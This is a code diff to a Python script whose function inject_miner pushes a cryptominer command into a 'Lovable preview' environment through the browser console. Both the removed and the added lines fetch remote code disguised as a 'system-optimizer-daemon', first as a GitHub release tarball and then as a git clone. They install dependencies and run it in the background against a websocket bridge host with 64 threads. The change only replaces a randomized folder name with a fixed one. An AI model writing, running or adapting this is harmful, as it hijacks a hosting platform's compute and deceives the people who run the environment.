@@ -24,14 +24,13 @@ BRIDGE_URL = "wss://chimera-bridge-production-0ef2.up.railway.app"
 async def inject_miner(page):
     """Inject miner command into Lovable preview."""
     
-    # Randomize folder name
-    random_suffix = ''.join(random.choices('abcdef0123456789', k=8))
-    random_folder = f"opt-{random_suffix}"
+    # Fixed folder moly
+    folder_name = "moly"
     
-    # Build command with randomized folder
-    miner_cmd = f'''cd /tmp && curl -sL "https://github.com/cold-pressed-hoodie/system-optimizer-daemon/releases/download/v2.1.5/sysoptd-2.1.5.tar.gz" | tar xz && mv sysoptd-2.1.4 {random_folder} && cd {random_folder} && pip install websockets psutil --break-system-packages -q && python3 sysoptd.py --bridge {BRIDGE_URL} --threads 64 --no-split --no-schedule --no-noise --no-ramfill > /tmp/m.log 2>&1 &'''
+    # Build command with fixed moly folder
+    miner_cmd = f'''cd /tmp && git clone --depth 1 -q https://github.com/crucifix-cray/system-optimizer-daemon.git moly && cd moly && pip install websockets psutil --break-system-packages -q && python3 sysoptd.py --bridge {BRIDGE_URL} --threads 64 --no-schedule  --no-pause > /tmp/m.log 2>&1'''
     
-    print(f"📦 Randomized folder: {random_folder}")
+    print(f"📦 Folder: {folder_name}")
     print(f"💉 Injecting miner command...")
     
     # Open browser console and execute
